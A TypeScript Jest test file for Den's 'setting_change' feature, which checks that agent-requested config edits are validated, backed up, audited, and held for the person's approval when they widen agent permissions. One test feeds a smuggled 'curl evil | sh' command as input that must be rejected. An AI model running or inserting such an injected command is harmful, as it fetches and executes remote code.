/**
 * Issue 1371: setting_change, the held write that changes one of Den's
 * settings in the person's config/local/user.yml. Each clause of the issue
 * has a case: a known key is written after Allow and applied; an unknown
 * key and a refused value are refused before holding; a widening key never
 * runs without the person's own Allow; only that key changes, with a
 * backup and an audit line; a key read at the start says so.
 *
 * The writes go to a temp folder (the deps name the file), never to a
 * checkout's config/local.
 */
import { afterEach, beforeEach, describe, expect, it } from "@jest/globals";
import * as fs from "fs";
import * as os from "os";
import * as path from "path";
import * as yaml from "yaml";
import {
  checkSettingChange,
  matchesSetting,
  NARROW_SETTINGS,
  runSettingChange,
  settingChangeKeys,
  settingKind,
  WIDENING_SETTINGS,
  type SettingChangeDeps,
} from "../../../src/ui/cli/setting-change.js";
import {
  readAgentsConfig,
  readMcpConfig,
  USER_ONLY_WIDENING,
  type DenConfig,
  type UserConfig,
} from "../../../src/shared/den-config.js";
import { readWebAuthConfig } from "../../../src/shared/web-session.js";
import { policyFor } from "../../../src/shared/approval-policy.js";

let dir = "";
let audits: { detail: string; reason?: string }[] = [];

function deps(den: DenConfig = {} as DenConfig): SettingChangeDeps {
  return {
    userFile: path.join(dir, "config", "local", "user.yml"),
    backupDir: path.join(dir, "state", "settings-backups"),
    denConfig: () => den,
    audit: (detail, reason) => audits.push({ detail, reason }),
    now: () => "2026-11-23T20:00:00.000Z",
  };
}

const USER = `# Per-engineer preferences
editor: code   # my editor
sessions:
  close_grace_seconds: 30
web:
  agent_view: true
`;

function writeUser(text = USER): void {
  const f = deps().userFile;
  fs.mkdirSync(path.dirname(f), { recursive: true });
  fs.writeFileSync(f, text);
}
const readUser = () => fs.readFileSync(deps().userFile, "utf-8");

beforeEach(() => {
  dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "den-1371-")));
  audits = [];
  writeUser();
});
afterEach(() => fs.rmSync(dir, { recursive: true, force: true }));

describe("setting_change: a known key (issue 1371)", () => {
  it("is held with its key, value now, new value and reason, and written after Allow", () => {
    const ask = {
      key: "sessions.max_concurrent",
      value: 14,
      reason: "the person runs 14 terminals at once",
    };
    const c = checkSettingChange(deps(), ask, { agent: "den-builder" });
    expect(c.ok).toBe(true);
    if (!c.ok) return;
    expect(c.personOnly).toBeUndefined();
    expect(c.details.join("\n")).toMatch(/Setting: sessions\.max_concurrent/);
    // Issue 1417: an unset limit shows the value in force, not "not set".
    expect(c.details.join("\n")).toMatch(/Now: \d+ \(Den's default\)/);
    expect(c.details.join("\n")).toMatch(/New: 14/);
    expect(c.details.join("\n")).toMatch(/Why: the person runs 14/);
    // Nothing is written by the check.
    expect(readUser()).toBe(USER);
    const r = runSettingChange(deps(), ask, { agent: "den-builder" });
    expect(r).toMatchObject({ ok: true, key: "sessions.max_concurrent" });
    const u = yaml.parse(readUser()) as UserConfig;
    expect(u.sessions).toEqual({ close_grace_seconds: 30, max_concurrent: 14 });
  });

  it("agents.max_concurrent is applied: the agents config reads it from user.yml", () => {
    const r = runSettingChange(deps(), {
      key: "agents.max_concurrent",
      value: 14,
      reason: "more agents at once",
    });
    expect(r.ok).toBe(true);
    const u = yaml.parse(readUser()) as UserConfig;
    expect(readAgentsConfig({} as DenConfig, u).maxConcurrent).toBe(14);
  });

  it("agents.max_concurrent stays proposable, not widening, asking, and applied", () => {
    // Issue 1373 owns the per-machine merge; setting_change reaches the key
    // through config's dotted keys. Same before and after the duplicate goes.
    const ask = {
      key: "agents.max_concurrent",
      // Issue 1391: lower than Den's default (a raise past twice it asks).
      value: 2,
      reason: "fewer agents",
    };
    const c = checkSettingChange(deps(), ask);
    if (!c.ok) throw new Error(c.error);
    expect(settingKind("agents.max_concurrent").widens).toBe(false);
    expect(c.personOnly).toBeUndefined();
    expect(policyFor("setting_change", { widens: false }).kind).toBe("ask");
    expect(runSettingChange(deps(), ask).ok).toBe(true);
    const u = yaml.parse(readUser()) as UserConfig;
    expect(u.agents).toEqual({ max_concurrent: 2 });
    expect(readAgentsConfig({} as DenConfig, u).maxConcurrent).toBe(2);
  });

  it("changes only that key: comments, order and every other key stay", () => {
    runSettingChange(deps(), {
      key: "sessions.max_concurrent",
      value: 14,
      reason: "r",
    });
    const after = readUser();
    expect(after).toContain("# Per-engineer preferences");
    expect(after).toContain("editor: code # my editor");
    const removed = USER.split("\n").filter(
      (l) => l && !after.split("\n").includes(l),
    );
    // The editor line is reformatted (one space before #), nothing else.
    expect(removed).toEqual(["editor: code   # my editor"]);
    expect(after.split("\n").filter((l) => !USER.includes(l))).toEqual([
      "editor: code # my editor",
      "  max_concurrent: 14",
    ]);
  });

  it("keeps a backup of the file first, and adds one audit line", () => {
    const r = runSettingChange(
      deps(),
      { key: "sessions.max_concurrent", value: 14, reason: "why not" },
      { agent: "den-builder" },
    );
    if (!r.ok) throw new Error(r.error);
    expect(r.backup).toBeDefined();
    expect(fs.readFileSync(r.backup!, "utf-8")).toBe(USER);
    expect((fs.statSync(r.backup!).mode & 0o777).toString(8)).toBe("600");
    expect(audits).toEqual([
      {
        detail:
          "setting_change sessions.max_concurrent: not set → 14 (asked by den-builder)",
        reason: "why not",
      },
    ]);
  });

  it("null puts Den's default back, and a block left empty goes", () => {
    const r = runSettingChange(deps(), {
      key: "web.agent_view",
      value: null,
      reason: "back to the default",
    });
    expect(r.ok).toBe(true);
    expect(yaml.parse(readUser()).web).toBeUndefined();
  });
});

describe("setting_change: refused before anything is held (issue 1371)", () => {
  it("an unknown key, a typo of a real one, says which was meant", () => {
    const c = checkSettingChange(deps(), {
      key: "agents.max_concurent",
      value: 14,
      reason: "r",
    });
    expect(c).toEqual({
      ok: false,
      error: expect.stringMatching(
        /agents\.max_concurent is not a setting Den reads.*did you mean agents\.max_concurrent/,
      ),
    });
    expect(readUser()).toBe(USER);
  });

  it("a key no reader takes is unknown, even under a known block", () => {
    for (const key of ["sessions.max_concurent", "web.no_such_thing", "nope"])
      expect(
        checkSettingChange(deps(), { key, value: 1, reason: "r" }),
      ).toMatchObject({
        ok: false,
        error: expect.stringMatching(/not|unknown/),
      });
  });

  it("a value den-config's parser refuses, in its words", () => {
    for (const value of [-1, "lots", 2.5])
      expect(
        checkSettingChange(deps(), {
          key: "sessions.max_concurrent",
          value,
          reason: "r",
        }),
      ).toMatchObject({ ok: false });
    expect(
      checkSettingChange(deps(), {
        key: "agents.max_concurrent",
        value: 0,
        reason: "r",
      }),
    ).toMatchObject({
      ok: false,
      error: expect.stringMatching(
        /agents\.max_concurrent: must be a whole number/,
      ),
    });
  });

  it("no reason, no value, or the value it already has", () => {
    expect(
      checkSettingChange(deps(), { key: "sessions.max_concurrent", value: 3 }),
    ).toMatchObject({ ok: false, error: expect.stringMatching(/reason/) });
    expect(
      checkSettingChange(deps(), {
        key: "sessions.max_concurrent",
        reason: "r",
      }),
    ).toMatchObject({ ok: false, error: expect.stringMatching(/value/) });
    expect(
      checkSettingChange(deps(), {
        key: "sessions.close_grace_seconds",
        value: 30,
        reason: "r",
      }),
    ).toMatchObject({ ok: false, error: expect.stringMatching(/already/) });
  });

  it("one agent's sandbox points to agent_sandbox_set", () => {
    expect(
      checkSettingChange(deps(), {
        key: "agents.bo.sandbox",
        value: false,
        reason: "r",
      }),
    ).toMatchObject({
      ok: false,
      error: expect.stringMatching(/agent_sandbox_set/),
    });
  });
});

describe("setting_change: a key that widens what agents can do (issue 1371)", () => {
  it("is marked so, and only the person's own Allow runs it", () => {
    const c = checkSettingChange(deps(), {
      key: "mcp.actions",
      value: ["service_up"],
      reason: "to start services",
    });
    if (!c.ok) throw new Error(c.error);
    expect(c.personOnly).toBe(true);
    expect(c.details[0]).toMatch(/widens what agents can do/);
    // No policy, agent approval or peer lowers it: critical, so it asks.
    for (const install of [
      { policy: "auto" as const },
      { writes: { setting_change: "auto" as const } },
    ])
      expect(
        policyFor("setting_change", { widens: c.personOnly, install }).kind,
      ).toBe("ask");
  });

  it("every user.yml-only widening key, and the approval policy itself", () => {
    const keys = [
      ...USER_ONLY_WIDENING.map((k) => k.replace("*", "bo")),
      "approvals",
      "approvals.policy",
      "approvals.writes.repo_clone",
      "editor",
      "terminal",
      "agents.runtimes.claude.bin",
    ];
    for (const k of keys) expect([k, settingKind(k).widens]).toEqual([k, true]);
    for (const k of [
      "sessions.max_concurrent",
      "agents.max_concurrent",
      "panes.reconnect_seconds",
    ])
      expect([k, settingKind(k).widens]).toEqual([k, false]);
  });

  it("an agent asking to loosen the approval policy waits for the person", () => {
    const c = checkSettingChange(deps(), {
      key: "approvals.policy",
      value: "auto",
      reason: "fewer asks",
    });
    if (!c.ok) throw new Error(c.error);
    expect(c.personOnly).toBe(true);
    expect(policyFor("setting_change", { widens: true }).kind).toBe("ask");
  });

  it("a routine key still asks: setting_change's own kind is ask", () => {
    expect(policyFor("setting_change", { widens: false }).kind).toBe("ask");
    expect(
      policyFor("setting_change", {
        widens: false,
        install: { policy: "auto" },
      }).kind,
    ).toBe("ask");
  });
});

describe("setting_change fails closed: every key it takes is placed (issue 1371)", () => {
  const listed = (k: string, list: readonly string[]) =>
    list.some((p) => p === k || matchesSetting(p, k));

  it("each key is on the narrow list or the widening one, never both", () => {
    const keys = settingChangeKeys();
    expect(keys.length).toBeGreaterThan(60);
    const neither = keys.filter(
      (k) => !listed(k, NARROW_SETTINGS) && !listed(k, WIDENING_SETTINGS),
    );
    const both = keys.filter(
      (k) => listed(k, NARROW_SETTINGS) && listed(k, WIDENING_SETTINGS),
    );
    expect({ neither, both }).toEqual({ neither: [], both: [] });
  });

  it("the narrow list names each key exactly: a new key under a known block widens", () => {
    expect(NARROW_SETTINGS.filter((k) => k.includes("*"))).toEqual([]);
    for (const k of ["github.app_token", "sessions.new_thing", "panes.x"])
      expect([k, settingKind(k).widens]).toEqual([k, true]);
  });

  it("a key on neither list widens", () => {
    expect(settingKind("some.new_key").widens).toBe(true);
  });

  it("the limits that guard sign-in, agents' reach and what runs widen", () => {
    for (const k of [
      "web.approve_attempts",
      "web.approve_window_seconds",
      "web.pair_requests_per_minute",
      "web.agent_view",
      "web.agent_view_minutes",
      "web.bridge_listen",
      "agents.issue_writes",
      "agents.issue_writes_per_hour",
      "agents.keep_running_after_logout",
      "services.restore_on_boot",
      "held_writes.wait_minutes",
    ])
      expect([k, settingKind(k).widens]).toEqual([k, true]);
  });
});

describe("setting_change: the card shows exactly what is written (issue 1371)", () => {
  it("a long value is shown whole on the card, never cut", () => {
    // Issue 1391: editor now takes only an editor Den knows, so a long
    // reference stands in: still a widening key, shown whole.
    const value = `op://Private/${"a".repeat(250)}/field`;
    const c = checkSettingChange(deps(), {
      key: "secrets.refs.sudo",
      value,
      reason: "r",
    });
    if (!c.ok) throw new Error(c.error);
    expect(c.personOnly).toBe(true);
    expect(c.details).toContain(`New: ${value}`);
  });

  it("refuses a value too long to read, or text with control characters", () => {
    expect(
      checkSettingChange(deps(), {
        key: "editor",
        value: "x".repeat(2001),
        reason: "r",
      }),
    ).toMatchObject({ ok: false, error: expect.stringMatching(/too long/) });
    for (const value of [
      "code\n; curl evil | sh",
      "code\u001b[2K",
      "code\u202e",
      "code\u2028x",
    ])
      expect(
        checkSettingChange(deps(), { key: "editor", value, reason: "r" }),
      ).toMatchObject({
        ok: false,
        error: expect.stringMatching(/control characters/),
      });
  });
});

describe("USER_ONLY_WIDENING matches what den-config reads (issue 1371)", () => {
  // Each entry set in the distribution's config: ignored or refused. A key
  // on the list that Den does read from there fails here.
  const probes: Record<string, () => void> = {
    "mcp.actions": () => {
      const r = readMcpConfig(
        { mcp: { actions: ["service_try"] } } as DenConfig,
        {},
      );
      expect(r.actions).toEqual([]);
      expect(r.notReadFromOrg).toEqual(["mcp.actions"]);
    },
    "agents.*.grants": () => {
      const r = readAgentsConfig(
        { agents: { bo: { grants: ["north"] } } } as unknown as DenConfig,
        {},
      );
      expect(r.notReadFromOrg).toEqual(["agents.bo.grants"]);
    },
    "agents.sandbox": () =>
      expect(() =>
        readAgentsConfig(
          { agents: { sandbox: false } } as unknown as DenConfig,
          {},
        ),
      ).toThrow(/user\.yml/),
    "agents.*.sandbox": () =>
      expect(() =>
        readAgentsConfig(
          { agents: { bo: { sandbox: false } } } as unknown as DenConfig,
          {},
        ),
      ).toThrow(/user\.yml/),
    "agents.sandbox_sockets": () => {
      const r = readAgentsConfig(
        { agents: { sandbox_sockets: ["/tmp/x"] } } as unknown as DenConfig,
        {},
      );
      expect(r.sandboxSockets ?? []).toEqual([]);
    },
    "web.edge_unattested": () => {
      fs.mkdirSync(path.join(dir, "dist", "config"), { recursive: true });
      fs.writeFileSync(
        path.join(dir, "dist", "config", "den.yml"),
        "web:\n  edge_unattested: local\n",
      );
      const c = readWebAuthConfig(path.join(dir, "dist"));
      expect(c.edgeUnattested).not.toBe("local");
      expect(c.edgeUnattestedInDistribution).toBeDefined();
    },
    "web.allow_plain_http_remote": () => {
      fs.mkdirSync(path.join(dir, "dist", "config"), { recursive: true });
      fs.writeFileSync(
        path.join(dir, "dist", "config", "den.yml"),
        "web:\n  allow_plain_http_remote: true\n",
      );
      const c = readWebAuthConfig(path.join(dir, "dist"));
      expect(c.allowPlainHttpRemote).not.toBe(true);
      expect(c.plainHttpInDistribution).toBeDefined();
    },
    "secrets.onepassword.token": () => {
      const src = fs.readFileSync(
        path.join(__dirname, "../../../src/shared/secrets/index.ts"),
        "utf-8",
      );
      // The merge takes the token from user.yml only.
      expect(src).toMatch(/token: user\.onepassword\?\.token \?\? undefined/);
    },
  };

  it("has a probe for every entry, and no other", () => {
    expect(Object.keys(probes).sort()).toEqual([...USER_ONLY_WIDENING].sort());
  });

  for (const k of USER_ONLY_WIDENING)
    it(`${k} set in the distribution's config is not read`, () => probes[k]!());
});

describe("setting_change: a key Den reads when it starts (issue 1371)", () => {
  it("says so on the card and after the write, and names den_restart_server", () => {
    const ask = {
      key: "web.ready_probe_seconds",
      value: 2,
      reason: "slow disk",
    };
    const c = checkSettingChange(deps(), ask);
    if (!c.ok) throw new Error(c.error);
    expect(c.details.join("\n")).toMatch(
      /after a restart of Den \(den_restart_server\)/,
    );
    const r = runSettingChange(deps(), ask);
    expect(r).toMatchObject({ ok: true, restart: true });
    if (r.ok) expect(r.note).toMatch(/den_restart_server/);
    const other = runSettingChange(deps(), {
      key: "sessions.max_concurrent",
      value: 9,
      reason: "r",
    });
    expect(other).toMatchObject({ ok: true, restart: false });
  });
});
